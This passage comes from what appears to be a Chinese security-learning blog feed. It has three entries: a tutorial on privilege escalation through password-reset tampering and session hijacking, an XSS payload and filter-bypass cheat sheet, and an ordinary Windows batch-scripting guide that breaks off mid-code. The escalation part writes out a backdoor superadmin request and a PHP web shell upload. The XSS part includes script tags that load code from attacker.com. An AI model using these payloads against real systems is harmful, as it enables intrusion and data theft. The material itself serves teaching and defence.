Intruder批量测试ID范围（如1-1000）</p><p>–​关键词搜索​</p><p>在页面源码搜索 admin、root、superuser</p><p>–​密码重置功能​</p><p>尝试重置用户密码，观察返回邮箱后缀（如 <a href="mailto:&#x61;&#x64;&#109;&#105;&#110;&#64;&#99;&#111;&#x6d;&#x70;&#x61;&#x6e;&#x79;&#46;&#99;&#x6f;&#x6d;">admin@company.com</a>）</p><p>​–员工名单泄露​</p><p>检查 &#x2F;team.html、&#x2F;aboutus.html等页面</p><h4 id="突破管理员账户"><a href="#突破管理员账户" class="headerlink" title="突破管理员账户"></a>突破管理员账户</h4><h5 id="方法1：窃取密码"><a href="#方法1：窃取密码" class="headerlink" title="方法1：窃取密码"></a>方法1：窃取密码</h5><ol><li><p>访问管理员资料页：<code>/profile?id=admin_id</code></p></li><li><p>查找页面中的敏感信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 可能泄露的内容 --&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;Admin123!&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;email&quot;&gt;admin@company.com&lt;/div&gt;</span><br><span class="line">      &lt;a href=&quot;reset_password?token=7aF3...&quot;&gt;忘记密码?&lt;/a&gt;</span><br></pre></td></tr></table></figure><h5 id="方法2：篡改密码重置"><a href="#方法2：篡改密码重置" class="headerlink" title="方法2：篡改密码重置"></a>方法2：篡改密码重置</h5></li></ol><h5 id="捕获普通用户的重置请求"><a href="#捕获普通用户的重置请求" class="headerlink" title="捕获普通用户的重置请求"></a>捕获普通用户的重置请求</h5><ol start="3"><li>修改为管理员ID重放：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- user=100</span><br><span class="line">+ user=admin_id</span><br></pre></td></tr></table></figure><h5 id="方法3：会话劫持"><a href="#方法3：会话劫持" class="headerlink" title="方法3：会话劫持"></a>方法3：会话劫持</h5><ol><li><p>在管理员资料页查找会话信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 可能泄露的JS代码</span><br><span class="line">var userSession = &#123;</span><br><span class="line">   </span><br><span class="line">  id: &quot;admin_id&quot;,</span><br><span class="line">  token: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&quot;,</span><br><span class="line">  role: &quot;admin&quot;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>复制会话值 → 用浏览器插件（如EditThisCookie）替换自己的Cookie</p></li></ol><h4 id="登录管理员账户"><a href="#登录管理员账户" class="headerlink" title="登录管理员账户"></a>登录管理员账户</h4><ul><li><p>直接使用窃取的密码登录</p></li><li><p>或使用会话令牌访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /admin_dashboard HTTP/1.1</span><br><span class="line">Cookie: session=stolen_admin_token</span><br></pre></td></tr></table></figure></li></ul><h4 id="执行垂直提权操作"><a href="#执行垂直提权操作" class="headerlink" title="执行垂直提权操作"></a>执行垂直提权操作</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 创建后门账户：</span><br><span class="line">POST /admin/create_user HTTP/1.1          username=backdoor&amp;password=hacked&amp;role=superadmin</span><br><span class="line">2. 部署WebShell：   </span><br><span class="line">POST /admin/upload HTTP/1.1   file=&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">3. 窃取数据库：</span><br><span class="line">GET /admin/export_db HTTP/1.1</span><br></pre></td></tr></table></figure><hr><h3 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 安全代码示例：双重验证</span><br><span class="line">public void accessProfile(String userId) &#123;</span><br><span class="line">  // 1. 从会话获取真实用户ID</span><br><span class="line">  String realUserId = getCurrentUser(); </span><br><span class="line"></span><br><span class="line">  // 2. 验证请求者身份</span><br><span class="line">  if (!realUserId.equals(userId)) &#123;</span><br><span class="line">    throw new AccessDeniedException();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 3. 敏感操作二次验证</span><br><span class="line">  if (action.equals(&quot;resetPassword&quot;)) &#123;</span><br><span class="line">    require2FA(); // 强制双因素认证</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS漏洞</title>
      <link href="/2025/09/XSS%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/09/XSS%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><h3 id="反射型-存储型XSS"><a href="#反射型-存储型XSS" class="headerlink" title="反射型&#x2F;存储型XSS"></a>反射型&#x2F;存储型XSS</h3><ol><li><p>反射型XSS：恶意代码未被服务器存储，利用get&#x2F;post方式提交恶意代码，一次性触发</p></li><li><p>存储型XSS：恶意代码被服务器存储，访问页面时触发</p></li></ol><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>页面中JavaScript代码执行后被注入了污染的变量</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="1-XSS标签"><a href="#1-XSS标签" class="headerlink" title="1.XSS标签"></a>1.XSS标签</h3><p>所有标签基本上都可以使用on事件触发恶意代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">onmousemove</span>=<span class="string">&quot;alert(&quot;</span><span class="attr">moved</span>&quot;)&quot;&gt;</span>this is a title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;error&#x27;)&quot;</span>/&gt;</span> # 不存在x的图片报错</span><br></pre></td></tr></table></figure><p><strong>有一种最基础的标签,是XSS的象征</strong>:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;error&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>还有一些其他类型的标签:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://attacker.com/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;svg/onload=alert(&#x27;error&#x27;)&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;import&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://attacker.com/a.js&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-HTML5特性的XSS"><a href="#2-HTML5特性的XSS" class="headerlink" title="2.HTML5特性的XSS"></a>2.HTML5特性的XSS</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">write(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用javascript行内式编写：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onclick=&#x27;alert(document.cooike)</span><br></pre></td></tr></table></figure><p>连接后变为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;text&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;name&#x27;</span> <span class="attr">id</span>=<span class="string">&#x27;id&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span><span class="attr">onclick</span>=<span class="string">&#x27;alert(document.cooike)’&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="3-伪协议"><a href="#3-伪协议" class="headerlink" title="3.伪协议"></a>3.伪协议</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>iframe和form也支持伪协议,但from只有提交表单时才会触发</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>而iframe不仅能实现JavaScript的伪协议,还有data等</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data://text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"># <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-二次渲染XSS"><a href="#4-二次渲染XSS" class="headerlink" title="4.二次渲染XSS"></a>4.二次渲染XSS</h3><p>略</p><h2 id="过滤和绕过"><a href="#过滤和绕过" class="headerlink" title="过滤和绕过"></a>过滤和绕过</h2><p>4.payloads绕过速查</p><table><thead><tr><th>绕过</th><th>描述</th></tr></thead><tbody><tr><td>结合js的html标签</td><td><code>&lt;img οnmοuseοver=&quot;alert(&#39;xxs&#39;)&quot;&gt;</code> <code>&lt;img src=xss οnerrοr=&quot;alert(1)&quot;&gt;</code></td></tr><tr><td>伪协议</td><td><code>&lt;a href=javascript:alert()&gt;xss&lt;/a&gt;&gt;</code></td></tr><tr><td>大小写绕过</td><td><code>&lt;scRipt&gt;alert(“XSS”)&lt;/scRipt&gt;</code></td></tr><tr><td>双写绕过</td><td><code>&lt;scrscriptipt&gt;alert(“XSS”);&lt;/scrscriptipt&gt;</code></td></tr><tr><td>html编码绕过</td><td>—</td></tr><tr><td>标签优先级绕过</td><td><code>&lt;noscript&gt;&lt;img src=&quot;asdasd&lt;/noscript&gt;&lt;img src=* οnerrοr=prompt(1)&gt;&quot;&gt;&lt;/noscript&gt;</code></td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>batch基础学习指南</title>
      <link href="/2025/09/batch%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/"/>
      <url>/2025/09/batch%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="批处理命令文件的编写和利用"><a href="#批处理命令文件的编写和利用" class="headerlink" title="批处理命令文件的编写和利用"></a>批处理命令文件的编写和利用</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>我在启动三角洲行动时遇见了cpu虚拟化相关报错，有进程或是应用占用了虚拟化，我之前一直使用的是VMware，随用随关，但是我将虚拟机搭载到windows支持的wsl2后由于使用了Hper-V服务占用了虚拟化导致三角洲行动不断报错，查看ace网页后要关闭Hper-V服务重启后才可以进入，但是我觉得相当繁琐，要关闭服务还要关闭内核隔离中的内存完整性，因此想要制作批处理脚本自动化执行命令，简化我之后的重复劳动。既然如此，那就做一篇有关于bat的markdown文件记录，顺手作为教程。</p><h2 id="bat基本语法命令"><a href="#bat基本语法命令" class="headerlink" title="bat基本语法命令"></a>bat基本语法命令</h2><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:: 这一行都是注释</span><br><span class="line">REM 这一行也都是注释</span><br></pre></td></tr></table></figure><h4 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;hello world&quot;</span><br><span class="line">::命令行界面输出hello world</span><br><span class="line">@echo [on|off]</span><br><span class="line">::打开|关闭回显</span><br><span class="line">chcp 65001</span><br><span class="line">::修改文档编码为utf-8,用于防止回显乱码</span><br><span class="line">echo %str%</span><br><span class="line">::输出字符串变量str的值</span><br></pre></td></tr></table></figure><h4 id="暂停"><a href="#暂停" class="headerlink" title="暂停"></a>暂停</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pause</span><br><span class="line">::输出&quot;请按任意键继续&quot;</span><br></pre></td></tr></table></figure><h4 id="设置变量"><a href="#设置变量" class="headerlink" title="设置变量"></a>设置变量</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set /a n=0</span><br><span class="line">REM 设置数字变量n=0</span><br><span class="line">set str=&quot;hello&quot;</span><br><span class="line">REM 设置字符串变量</span><br><span class="line">set arr=1 2 3 4 5</span><br><span class="line">::设置数组变量</span><br></pre></td></tr></table></figure><h4 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">set res=%str1% %str2%</span><br><span class="line">REM 连接字符串</span><br><span class="line">set str=%str1:~0,3%</span><br><span class="line">::字符串截取,从第0位开始截取三个字符</span><br><span class="line">echo %str:~3,5%</span><br><span class="line">::输出第三位开始共五个字符,用于查找</span><br><span class="line">%str:abc=xyz%</span><br><span class="line">::用于将字符串中abc替换为xyz</span><br></pre></td></tr></table></figure><h4 id="获取程序返回码"><a href="#获取程序返回码" class="headerlink" title="获取程序返回码"></a>获取程序返回码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo %errorlevel%</span><br><span class="line">::判断上一条命令是否成功,默认情况输出0</span><br></pre></td></tr></table></figure><h4 id="更改CMD标题-以及背景颜色"><a href="#更改CMD标题-以及背景颜色" class="headerlink" title="更改CMD标题,以及背景颜色"></a>更改CMD标题,以及背景颜色</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title &quot;三角洲行动bat文件&quot;</span><br><span class="line">color 02</span><br><span class="line">::作用不大,不做介绍</span><br></pre></td></tr></table></figure><h3 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h3><h4 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if [not] 条件 命令</span><br><span class="line">::当条件为真[假]时执行命令</span><br><span class="line">equ &quot;=&quot;</span><br><span class="line">neq &quot;!=&quot;</span><br><span class="line">lss &quot;&lt;&quot;</span><br><span class="line">leq &quot;&lt;=&quot;</span><br><span class="line">gtr &quot;&gt;&quot;</span><br><span class="line">geq &quot;&gt;=&quot;</span><br></pre></td></tr></table></figure><h4 id="标签跳跃"><a href="#标签跳跃" class="headerlink" title="标签跳跃"></a>标签跳跃</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">:标签名</span><br><span class="line">......</span><br><span class="line">if %var% leq 3 GOTO start</span><br><span class="line">::当var&lt;=3时执行标签符goto,跳转到start的地方向下继续执行</span><br></pre></td></tr></table></figure><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">for的作用：在Bat脚本中用于执行循环和遍历操作。它可以遍历文件、文件夹、字符串列表等，并对每个元素执行一组命令。语法如下：</span><br><span class="line">for %parameter in (set) do command</span><br><span class="line"></span><br><span class="line">补充说明：</span><br><span class="line">%%parameter是一个可以替代的循环变量，可以使用任意名称，在bat的for中使用。</span><br><span class="line"></span><br><span class="line">%parameter这个关键字不能在bat中使用，只能在CMD命令下的for中使用。</span><br><span class="line"></span><br><span class="line">in和do之间括号不能省略，之间的(set) 表示指定要遍历的元素集合的表达式，其可以是文件名、文件夹路径、字符串列表或一些其他的表达式，</span><br><span class="line"></span><br><span class="line">变量可以是一个，也可以是多个，每一个字符串或变量，我们称之为一个元素，每个元素之间，用空格键、跳格键、逗号、分号或等号分隔；</span><br><span class="line"></span><br><span class="line">for /f </span><br><span class="line">::遍历指定目录下所有的文件和文件夹</span><br><span class="line">for /d </span><br><span class="line">::遍历指定目录下所有的文件夹</span><br><span class="line">for /r </span><br><span class="line">::遍历指定目录下所有的文件和子文件夹中的文件</span><br><span class="line"></span><br><span class="line">::遍历文件夹中的文件</span><br><span class="line">for %%f in (D:\path\to\folder\*) do (</span><br><span class="line">    echo %%f</span><br><span class="line">    REM 在此处执行其他命令</span><br><span class="line">)</span><br><span class="line">::* 是要遍历的文件夹路径和通配符，%%f 是循环变量</span><br><span class="line"></span><br><span class="line">::遍历文件内容行</span><br><span class="line">for /F &quot;delims=&quot; %%l in (file.txt) do (</span><br><span class="line">    echo %%l</span><br><span class="line">    REM 在此处执行其他命令</span><br><span class="line">)</span><br><span class="line">::(file.txt) 是要遍历的文件，%%l 是循环变量，遍历文件的每一行，并在每次循环中执行一组命令。</span><br><span class="line">::/F选项指示 For 命令读取文件内容而不是文件名。</span><br><span class="line"></span><br><span class="line">::遍历字符串列表</span><br><span class="line">for %%s in (apple orange banana) do (</span><br><span class="line">echo %%s</span><br><span class="line">REM 在此处执行其他命令 )</span><br><span class="line">::apple orange banana是要遍历的字符串列表，%%s是循环变量，遍历列表中的每个元素</span><br><span class="line">此元素引用自csdn</span><br></pre></td></tr></table></figure><h3 id="处理命令"><a href="#处理命令" class="headerlink" title="处理命令"></a>处理命令</h3><h4 id="调用外部程序"><a href="#调用外部程序" class="headerlink" title="调用外部程序"></a>调用外部程序</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">start 程序 [参数]</span><br><span class="line">/D</span><br><span class="line">::指定起始目录</span><br><span class="line">/MIN[MAX]</span><br><span class="line">::最小化[最大化]启动窗口</span><br><span class="line">/WAIT</span><br><span class="line">::程序结束后再执行脚本</span><br><span class="line">/B</span><br><span class="line">::在同一窗口执行程序</span><br><span class="line">/b</span><br><span class="line">::隐藏控制台执行程序</span><br></pre></td></tr></table></figure><h4 id="调用其他batch文件"><a href="#调用其他batch文件" class="headerlink" title="调用其他batch文件"></a>调用其他batch文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call batch文件</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">call script.bat</span><br></pre></td></tr></table></figure><h4 id="文本文件显示"><a href="#文本文件显示" class="headerlink" title="文本文件显示"></a>文本文件显示</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">type text.txt</span><br><span class="line">---</span><br><span class="line">type 文件名 | find &quot;关键字&quot;</span><br><span class="line">::查找文件中的关键字</span><br></pre></td></tr></table></figure><h4 id="变量延迟赋值"><a href="#变量延迟赋值" class="headerlink" title="变量延迟赋值"></a>变量延迟赋值</h4><p>这个其实可以不用知道,唯一要确定的就是命令要单独一行,不要一行中出现两条命令</p><h3 id="特殊符号命令"><a href="#特殊符号命令" class="headerlink" title="特殊符号命令"></a>特殊符号命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@</span><br><span class="line">::关闭当前行的回显</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;</span><br><span class="line">---</span><br><span class="line">echo hello&gt;test.txt</span><br><span class="line">::将test文件的内容替换为hello</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line">::在文件末尾追加字符串</span><br><span class="line">---</span><br><span class="line">echo hello&gt;&gt;test.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">^</span><br><span class="line">---</span><br><span class="line">::转义字符,但只用于&lt; &gt; 回车符</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;</span><br><span class="line">::命令连接符,不论前面的命令有没有出错都执行下一个指令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;</span><br><span class="line">::失败就不向后执行了</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">||</span><br><span class="line">::成功就不执行了</span><br></pre></td></tr></table></figure><h2 id="更高的阶梯"><a href="#更高的阶梯" class="headerlink" title="更高的阶梯"></a>更高的阶梯</h2><h3 id="检测管理员权限"><a href="#检测管理员权限" class="headerlink" title="检测管理员权限"></a>检测管理员权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">:: 方法1：NET SESSION检测法（推荐）</span><br><span class="line">net session &gt;nul 2&gt;&amp;1</span><br><span class="line">if %errorLevel% neq 0 (</span><br><span class="line">    echo 请右键以管理员身份运行！</span><br><span class="line">    timeout /t 3</span><br><span class="line">    exit </span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">:: 方法2：FLTMC检测法</span><br><span class="line">fltmc &gt;nul 2&gt;&amp;1 || (</span><br><span class="line">    echo 需要管理员权限！</span><br><span class="line">    pause</span><br><span class="line">    exit</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ol><li><p>首先,<code>net session</code>是只有管理员权限才可以进行的操作,网络会话查看</p></li><li><p><code>&gt;</code>重定向符,把net session的标准输出stdout定向到一个空设备,意味着丢弃</p></li><li><p>1表示标准输出,2表示错误输出,这是把错误输出定向到标准输出里,但是标准输出被定向到空设备丢弃,所以错误输出也会被丢弃.</p></li><li><p>之所以很复杂是因为,net session如果执行失败,它不会有标准输出,会有报错,也就是错误输出,此时按照原理丢弃</p></li><li><p>如果执行成功,会输出标准输,没有错误输出,会被丢弃,这会是一种没有任何输出的安静的检验管理员权限的办法</p></li><li><p>%errorlevel%捕获了上行的返回码,用于逻辑判断</p></li></ol><h3 id="更深的路"><a href="#更深的路" class="headerlink" title="更深的路"></a>更深的路</h3><p>    基本的操作和检测管理员权限已经讲清，剩余的是有关于dism高级命令等一系列命令脚本，会慢更新。</p><h4 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h4><p>在我使用deepseek创建脚本时出现报错,batch作为Windows的胶水语言随版本更新总会出现一些意想不到的结果,但这并不是batch的错,所以出现兼容性问题时先查看命令或者特性有没有被新版本删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 